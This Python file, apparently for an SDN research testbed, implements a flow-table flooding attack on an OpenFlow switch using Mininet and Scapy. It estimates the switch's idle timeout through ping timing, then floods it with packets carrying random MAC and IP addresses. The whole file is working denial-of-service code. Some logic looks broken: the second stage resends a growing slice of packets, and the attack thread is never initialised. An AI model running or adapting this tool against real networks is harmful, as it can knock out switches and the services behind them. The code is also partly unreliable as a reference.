import os
import random
import time
import re

from typing import List
from threading import Thread, Event

from mininet.node import OVSSwitch, Intf, Host

from scapy.all import (
    Ether, IP, TCP, UDP, ICMP, Packet, sendp, srp1, getmacbyip,
    fuzz, RandIP, RandMAC, RandChoice, RandShort
)

class FTFUtils:
    @staticmethod
    def random_mac() -> str:
        return str(RandMAC())

    @staticmethod
    def random_ip() -> str:
        return str(RandIP())

    @staticmethod
    def random_port() -> int:
        return random.randint(1024, 65535)

    SUPPORTED_PROTOS = ["TCP", "UDP", "ICMP"]

    @staticmethod
    def random_proto() -> str:
        return random.choice(FTFUtils.SUPPORTED_PROTOS)

    @staticmethod
    def random_data() -> bytes:
        n = random.randint(100, 1400)
        return os.urandom(n)

    @staticmethod
    def build_packet(src_mac: str, src_ip: str, dst_mac: str, dst_ip: str) -> Packet:
        eth = Ether(src=src_mac, dst=dst_mac)
        ip  = IP(src=src_ip, dst=dst_ip)
        proto = FTFUtils.random_proto()
        if proto == "TCP":
            transport = TCP(
                sport=FTFUtils.random_port(),
                dport=FTFUtils.random_port(),
                flags="S"
            )
        elif proto == "UDP":
            transport = UDP(
                sport=FTFUtils.random_port(),
                dport=FTFUtils.random_port()
            )
        elif proto == "ICMP":
            transport = ICMP(
                type=random.choice([0, 8]),   # 0 = reply, 8 = echo request
                code=0
            )
        return eth / ip / transport / FTFUtils.random_data()

    @staticmethod
    def random_af(attack_frequency: int) -> int:
        start = int(attack_frequency * 0.2)
        return random.randint(start, attack_frequency - 1) if attack_frequency != 0 else 0

    @staticmethod
    def random_anp(added_new_packet: int) -> int:
        start = int(added_new_packet * 0.2)
        return random.randint(start, added_new_packet) if added_new_packet != 0 else 0

    @staticmethod
    def measure_rtt(src: Host, dst: Host, timeout=10) -> float:
        out = src.cmd(f'ping -c 1 -W {timeout} {dst.IP()}')
        m = re.search(r'time=([\d.]+)\s*ms', out)
        if not m:
            return None
        rtt = float(m.group(1)) #ms
        t = time.time()
        print(t, rtt)
        return rtt

    @staticmethod
    def estimate_idle_timeout(src_host: Host, dst_host: Host, MAX_INT: int, MAX_INTERVAL: int) -> int:
        rtt0 = FTFUtils.measure_rtt(src_host, dst_host)
        time.sleep(1)
        rtt1 = FTFUtils.measure_rtt(src_host, dst_host)

        if rtt0 is None or rtt1 is None:
            print(f"[!] Not reachable host {dst_host.IP()}")
            return None

        if abs(rtt1 - rtt0) / rtt1 <= 0.1: #ms
            print("[!] No Packet In")
            return None
        
        interval = 1
        for _ in range(MAX_INT):
            time.sleep(interval)
            rtti = FTFUtils.measure_rtt(src_host, dst_host)
            if rtti is None:
                print("[!] Failed Probe")
                return None
            if abs(rtti - rtt0) / rtti <= 0.25:
                return interval
            interval += 1
            if interval > MAX_INTERVAL:
                break
        return None

class FTFAttack:
    def __init__(self, switch, iface, npacket, added_new_packets, 
                net=None, probe_src='h7', probe_dst='h6'):
        self.switch = switch
        self.iface = iface
        self.npacket = npacket
        self.net = net
        self.added_new_packets = added_new_packets
        self.probe_src = probe_src
        self.probe_dst = probe_dst
        self.attack_frequency = 0
        self.max_iter = 1000
        self.max_interval = 100
        self.macs: List[str] = []
        self._stop_event: Event = Event()
        print("[+] Switch: {}\n[+] IFace: {}\n".format(self.switch.name, self.iface.name))

    def stage_0(self) -> None:
        src_host = self.net.get(self.probe_src)
        dst_host = self.net.get(self.probe_dst)
        print("[*] Tidle...")
        self.attack_frequency = FTFUtils.estimate_idle_timeout(src_host, dst_host, self.max_iter, self.max_interval)
        print(f"[*] Tidle={self.attack_frequency}")

    def stage_1(self) -> None:
        if self._stop_event.is_set():
            return
        packets: List[Packet] = []
        print("[*] Crafting")
        for _ in range(self.npacket):
            src_mac = FTFUtils.random_mac()
            src_ip = FTFUtils.random_ip()
            packet = FTFUtils.build_packet(src_mac, src_ip, "ff:ff:ff:ff:ff:ff", "10.0.0.255")
            self.macs.append(src_mac)
            packets.append(packet)
        print("[*] Crafted")
        print("[*] Sending")
        i = 0
        while i<len(packets):
            j = FTFUtils.random_anp(self.added_new_packets)
            sendp(packets[i:i + j], iface=self.iface.name, verbose=False)
            time.sleep(FTFUtils.random_af(self.attack_frequency))
            i += j
        print("[*] Sent")

    def stage_2(self) -> None:
        if self._stop_event.is_set():
            return
        local_pool = self.macs.copy()
        random.shuffle(local_pool)
        packets: List[Packet] = []
        print("[*] Crafting")
        for i in range(self.npacket):
            src_mac = FTFUtils.random_mac()
            src_ip = FTFUtils.random_ip()
            dst_mac = local_pool[i % len(local_pool)]
            dst_ip = FTFUtils.random_ip()
            packet = FTFUtils.build_packet(src_mac, src_ip, dst_mac, dst_ip)
            packets.append(packet)
        print("[*] Crafted")
        print("[*] Sending")
        i = 0
        while i<len(packets):
            j = FTFUtils.random_anp(self.added_new_packets)
            sendp(packets[0:i + j], iface=self.iface.name, verbose=False)
            time.sleep(FTFUtils.random_af(self.attack_frequency))
            i += j
        print("[*] Sent")

    def run(self):
        """Corpo dell'attacco eseguito nel thread interno."""
        print("# [STAGE 0] Tidle Inference")
        self.stage_0()
        print("# [STAGE 1] MAC Presenting")
        self.stage_1()
        print("# [STAGE 2] Flooding")
        self.stage_2()
        print("[+] Attacco completato.")

    def start(self) -> None:
        self._stop_event.clear()
        self._attack_thread = Thread(target=self.run, name="flood-attack", daemon=True)
        self._attack_thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._attack_thread and self._attack_thread.is_alive():
            self._attack_thread.join(timeout=10)
            if self._attack_thread.is_alive():
                print("[!] Timeout: il thread di attacco non si è fermato.")
            else:
                print("[+] Thread di attacco terminato.")

    def is_running(self) -> bool:
        return self._attack_thread is not None and self._attack_thread.is_alive()

    def join(self, timeout: float = None) -> None:
        if self._attack_thread:
            self._attack_thread.join(timeout=timeout)
        